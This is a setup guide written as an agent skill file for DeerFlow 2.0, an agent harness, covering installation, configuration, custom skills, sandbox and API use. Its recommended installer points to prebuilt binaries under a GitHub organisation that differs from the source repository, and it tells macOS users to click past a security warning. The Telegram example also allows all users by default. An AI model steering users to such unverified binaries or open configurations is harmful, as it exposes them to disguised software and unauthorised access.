```markdown
---
name: deerflow-super-agent-harness
description: Install, configure, and extend DeerFlow 2.0 — an open-source super agent harness that orchestrates sub-agents, memory, sandboxes, and skills to handle complex multi-step tasks.
triggers:
  - set up DeerFlow
  - install deer-flow agent
  - configure DeerFlow skills
  - add custom skills to DeerFlow
  - DeerFlow sub-agent setup
  - connect DeerFlow to Telegram Slack or Feishu
  - DeerFlow sandbox execution
  - how to use DeerFlow deep research
---

# 🦌 DeerFlow 2.0 Super Agent Harness

> Skill by [ara.so](https://ara.so) — Daily 2026 Skills collection.

DeerFlow (**D**eep **E**xploration and **E**fficient **R**esearch **Flow**) is an open-source super agent harness built on LangGraph and LangChain. It orchestrates sub-agents, persistent memory, sandboxed execution, and extensible skills to handle tasks ranging from deep research to code execution, slide generation, and automated content workflows.

---

## Installation

### Option 1: Installer (Recommended)

Download the pre-built installer from the [Releases page](https://github.com/bytedance-deerflow/deer-flow-installer/releases):

| Platform | File |
|----------|------|
| Windows  | `deer-flow_x64.exe` |
| macOS    | `deer-flow_macOS.dmg` |
| Archive  | `deer-flow_x64.7z` |

**macOS:**
```bash
# After downloading the DMG, drag to Applications, then:
# Right-click → Open if you see a security warning
# deer-flow command becomes available in terminal
deer-flow --help
```

**Windows:**
```
1. Run deer-flow_x64.exe
2. Follow installer prompts
3. Open Deer-Flow from Start Menu
```

### Option 2: From Source

```bash
# Clone the repository
git clone https://github.com/bytedance/deer-flow.git
cd deer-flow

# Install Python dependencies (Python 3.10+ required)
pip install -r requirements.txt

# Copy and configure environment
cp .env.example .env
```

---

## Configuration

### Environment Variables (`.env`)

```bash
# LLM Provider — OpenAI-compatible API
OPENAI_API_KEY=your_openai_api_key
OPENAI_BASE_URL=https://api.openai.com/v1   # or any compatible endpoint

# Optional: Anthropic
ANTHROPIC_API_KEY=your_anthropic_api_key

# Web Search
TAVILY_API_KEY=your_tavily_api_key          # recommended for research tasks
BRAVE_API_KEY=your_brave_api_key            # alternative

# Messaging channels (optional)
TELEGRAM_BOT_TOKEN=your_telegram_bot_token
SLACK_BOT_TOKEN=xoxb-your_slack_bot_token
SLACK_APP_TOKEN=xapp-your_slack_app_token
FEISHU_APP_ID=your_feishu_app_id
FEISHU_APP_SECRET=your_feishu_app_secret
```

### `config.yaml`

```yaml
# Sandbox execution mode
sandbox:
  mode: docker          # Options: local | docker | kubernetes

# LangGraph server
langgraph:
  url: http://localhost:2024

# Gateway API
gateway:
  url: http://localhost:8001
  port: 8001

# Model configuration
models:
  default: gpt-4o
  reasoning: o3-mini     # for complex planning tasks
  multimodal: gpt-4o     # for image/video understanding

# Channels (messaging integrations)
channels:
  langgraph_url: http://localhost:2024
  gateway_url: http://localhost:8001

  session:
    assistant_id: lead_agent
    config:
      recursion_limit: 100
    context:
      thinking_enabled: true
      is_plan_mode: false
      subagent_enabled: true

  telegram:
    enabled: true
    bot_token: $TELEGRAM_BOT_TOKEN
    allowed_users: []   # empty = allow all users

  slack:
    enabled: false
    bot_token: $SLACK_BOT_TOKEN
    app_token: $SLACK_APP_TOKEN
    allowed_users: []

  feishu:
    enabled: false
    app_id: $FEISHU_APP_ID
    app_secret: $FEISHU_APP_SECRET
```

---

## Key Commands (CLI)

```bash
# Start DeerFlow server
deer-flow start

# Start with specific config
deer-flow start --config config.yaml

# Run a single task (non-interactive)
deer-flow run "Research the latest trends in quantum computing and write a report"

# List available skills
deer-flow skills list

# Install a custom skill
deer-flow skills install ./my-skill/

# Check sandbox status
deer-flow sandbox status

# View memory
deer-flow memory show

# Clear memory
deer-flow memory clear
```

---

## Skill System

### Built-in Skills

Skills live in `/mnt/skills/public/` inside the sandbox container:

```
/mnt/skills/public/
├── research/SKILL.md
├── report-generation/SKILL.md
├── slide-creation/SKILL.md
├── web-page/SKILL.md
└── image-generation/SKILL.md
```

### Creating a Custom Skill

Skills are Markdown files with structured workflow definitions. Place them in `/mnt/skills/custom/`:

```markdown
# my-custom-skill/SKILL.md

## Skill: Data Pipeline Builder

### Purpose
Automate the creation of ETL data pipelines from natural language descriptions.

### Workflow
1. Parse the user's data source description
2. Identify source format (CSV, JSON, SQL, API)
3. Generate Python ETL script using pandas/polars
4. Validate with sample data
5. Output pipeline script to /mnt/user-data/outputs/

### Best Practices
- Always validate schema before transformation
- Handle null values explicitly
- Log each pipeline stage

### Resources
- pandas docs: https://pandas.pydata.org/docs/
- Tool: bash_execution for running scripts
```

```bash
# Install the custom skill
mkdir -p /mnt/skills/custom/data-pipeline
cp my-custom-skill/SKILL.md /mnt/skills/custom/data-pipeline/SKILL.md

# Or via CLI
deer-flow skills install ./my-custom-skill/
```

---

## Sandbox & File System

The sandbox container exposes these paths:

```
/mnt/user-data/
├── uploads/      ← place input files here before starting a task
├── workspace/    ← agent working directory (intermediate files)
└── outputs/      ← final deliverables retrieved here

/mnt/skills/
├── public/       ← built-in skills (read-only)
└── custom/       ← your custom skills (read-write)
```

### Python: Interacting with the Sandbox Programmatically

```python
import subprocess
import os

def run_in_sandbox(command: str, working_dir: str = "/mnt/user-data/workspace") -> str:
    """Execute a command inside the DeerFlow sandbox."""
    result = subprocess.run(
        ["docker", "exec", "deerflow-sandbox", "bash", "-c", command],
        capture_output=True,
        text=True,
        cwd=working_dir
    )
    if result.returncode != 0:
        raise RuntimeError(f"Sandbox error: {result.stderr}")
    return result.stdout

def upload_file(local_path: str) -> str:
    """Upload a file to the sandbox input directory."""
    filename = os.path.basename(local_path)
    dest = f"/mnt/user-data/uploads/{filename}"
    subprocess.run([
        "docker", "cp", local_path, f"deerflow-sandbox:{dest}"
    ], check=True)
    return dest

def download_output(filename: str, local_dest: str) -> None:
    """Retrieve a file from the sandbox output directory."""
    src = f"deerflow-sandbox:/mnt/user-data/outputs/{filename}"
    subprocess.run(["docker", "cp", src, local_dest], check=True)
```

---

## Sub-Agent Patterns

DeerFlow's lead agent automatically spawns sub-agents for complex tasks. You can guide this behavior through your prompts:

```python
# Example: Prompting DeerFlow to use parallel sub-agents
task = """
Research the competitive landscape for electric vehicles in 2025.
Use parallel research agents to cover:
1. Market share analysis (Tesla, BYD, Rivian, Lucid)
2. Battery technology advancements
3. Charging infrastructure developments
4. Government policy changes

Synthesize all findings into a comprehensive report saved to outputs/.
"""

# Via the API
import httpx

async def submit_task(task: str, assistant_id: str = "lead_agent"):
    async with httpx.AsyncClient() as client:
        response = await client.post(
            "http://localhost:2024/runs",
            json={
                "assistant_id": assistant_id,
                "input": {"messages": [{"role": "user", "content": task}]},
                "config": {
                    "recursion_limit": 100,
                    "configurable": {
                        "thinking_enabled": True,
                        "subagent_enabled": True,
                        "is_plan_mode": False
                    }
                }
            }
        )
        return response.json()
```

---

## LangGraph API Integration

DeerFlow exposes a LangGraph-compatible API at `http://localhost:2024`:

```python
from langgraph_sdk import get_client

async def run_deerflow_task(task: str):
    client = get_client(url="http://localhost:2024")

    # Create a thread
    thread = await client.threads.create()

    # Stream the response
    async for chunk in client.runs.stream(
        thread_id=thread["thread_id"],
        assistant_id="lead_agent",
        input={"messages": [{"role": "user", "content": task}]},
        config={
            "recursion_limit": 100,
            "configurable": {
                "thinking_enabled": True,
                "subagent_enabled": True
            }
        },
        stream_mode="updates"
    ):
        print(chunk)

# Run it
import asyncio
asyncio.run(run_deerflow_task(
    "Create a slide deck about renewable energy trends with charts"
))
```

---

## MCP Server Configuration

Extend DeerFlow with custom tools via MCP servers:

```yaml
# config.yaml
mcp_servers:
  - name: my-custom-tools
    transport: http
    url: http://localhost:3001/mcp
    auth:
      type: client_credentials
      token_url: https://auth.example.com/oauth/token
      client_id: $MCP_CLIENT_ID
      client_secret: $MCP_CLIENT_SECRET

  - name: local-tools
    transport: stdio
    command: python
    args: ["-m", "my_mcp_server"]
```

```python
# Example: Simple MCP tool server in Python
from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp import types

server = Server("my-custom-tools")

@server.list_tools()
async def list_tools() -> list[types.Tool]:
    return [
        types.Tool(
            name="fetch_database",
            description="Query the internal database",
            inputSchema={
                "type": "object",
                "properties": {
                    "query": {"type": "string", "description": "SQL query"},
                },
                "required": ["query"]
            }
        )
    ]

@server.call_tool()
async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:
    if name == "fetch_database":
        # Your implementation here
        result = execute_query(arguments["query"])
        return [types.TextContent(type="text", text=str(result))]

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream, server.create_initialization_options())

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
```

---

## Messaging Channel Setup

### Telegram

```bash
# 1. Create bot via @BotFather → /newbot → copy token
# 2. Set in .env:
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrSTUvwxYZ

# 3. Enable in config.yaml:
# channels.telegram.enabled: true

# Available commands in Telegram chat:
# /new      — Start a new conversation
# /status   — Show current thread info
# /models   — List available models
# /memory   — View memory
# /help     — Show help
```

### Slack (Socket Mode)

```bash
# 1. Create app at api.slack.com/apps
# Required Bot Token Scopes:
#   app_mentions:read, chat:write, im:history,
#   im:read, im:write, files:write
# 2. Enable Socket Mode → generate App-Level Token (xapp-...)
#    with connections:write scope
# 3. Subscribe to events: app_mention, message.im
# 4. Set in .env:
SLACK_BOT_TOKEN=xoxb-your-bot-token
SLACK_APP_TOKEN=xapp-your-app-token
```

---

## Long-Term Memory

```python
# DeerFlow manages memory automatically across sessions.
# You can interact with memory via CLI:

# View stored memory
# deer-flow memory show

# Clear all memory
# deer-flow memory clear

# Programmatically via the Gateway API
import httpx

def get_memory(user_id: str = "default"):
    response = httpx.get(
        "http://localhost:8001/memory",
        params={"user_id": user_id}
    )
    return response.json()

def update_memory(key: str, value: str, user_id: str = "default"):
    response = httpx.post(
        "http://localhost:8001/memory",
        json={"user_id": user_id, "key": key, "value": value}
    )
    return response.json()
```

---

## Recommended Models

| Use Case | Recommended Model |
|----------|------------------|
| General tasks | `gpt-4o`, `claude-3-5-sonnet` |
| Complex reasoning / planning | `o3-mini`, `claude-3-5-sonnet` |
| Image/video understanding | `gpt-4o`, `gemini-1.5-pro` |
| Long-context research | `gemini-1.5-pro` (1M tokens), `claude-3-5-sonnet` |
| Cost-efficient subtasks | `gpt-4o-mini`, `claude-3-haiku` |

Any OpenAI-compatible endpoint works — set `OPENAI_BASE_URL` to point to your provider.

---

## Common Task Patterns

```python
# Pattern 1: Deep Research Report
task_research = """
Research [topic] thoroughly. Use multiple search queries, cross-reference sources,
and produce a structured report with citations saved to /mnt/user-data/outputs/report.md
"""

# Pattern 2: Code + Execute
task_code = """
Write a Python script that [describes task], execute it in the sandbox,
show the output, and save the script to /mnt/user-data/outputs/solution.py
"""

# Pattern 3: Slide Deck Generation
task_slides = """
Create a professional slide deck about [topic] with:
- 10-12 slides
- Data visualizations where appropriate
- Speaker notes for each slide
Save as /mnt/user-data/outputs/presentation.pptx
"""

# Pattern 4: Web Page Creation
task_webpage = """
Build a single-page website about [topic] with:
- Modern responsive design
- Interactive elements
- Save to /mnt/user-data/outputs/index.html
"""
```

---

## Troubleshooting

### Docker sandbox won't start
```bash
# Verify Docker is running
docker info

# Check DeerFlow sandbox container
docker ps -a | grep deerflow

# Restart the sandbox
deer-flow sandbox restart

# Check logs
docker logs deerflow-sandbox
```

### LangGraph API not responding
```bash
# Check if server is running
curl http://localhost:2024/health

# Restart the LangGraph server
deer-flow start --reset

# Check port conflicts
lsof -i :2024
```

### Skills not loading
```bash
# Verify skill file structure
ls -la /mnt/skills/custom/your-skill/
# Must contain SKILL.md at the root

# Validate SKILL.md is readable
cat /mnt/skills/custom/your-skill/SKILL.md

# Force skill reload
deer-flow skills reload
```

### Memory issues across sessions
```bash
# Check memory store location
deer-flow memory show --verbose

# Reset corrupted memory
deer-flow memory clear --confirm

# Re-initialize
deer-flow memory init
```

### MCP server connection failures
```bash
# Test MCP server independently
python -m my_mcp_server --test

# Check config.yaml MCP server URLs are reachable
curl http://localhost:3001/mcp/health

# Enable verbose MCP logging
DEERFLOW_LOG_LEVEL=debug deer-flow start
```

---

## Project Structure (Source)

```
deer-flow/
├── config.yaml              ← main configuration
├── .env                     ← secrets and API keys
├── requirements.txt
├── src/
│   ├── agents/
│   │   ├── lead_agent.py    ← orchestrator
│   │   └── sub_agent.py     ← spawned workers
│   ├── skills/              ← skill loader
│   ├── memory/              ← persistence layer
│   ├── sandbox/             ← execution environment
│   ├── tools/               ← built-in tools
│   └── channels/            ← IM integrations
│       ├── telegram.py
│       ├── slack.py
│       └── feishu.py
└── skills/
    └── public/              ← built-in SKILL.md files
```

---

## Resources

- **GitHub**: https://github.com/bytedance/deer-flow
- **Installer Releases**: https://github.com/bytedance-deerflow/deer-flow-installer/releases
- **LangGraph Docs**: https://langchain-ai.github.io/langgraph/
- **MCP Protocol**: https://modelcontextprotocol.io/
- **License**: MIT
```
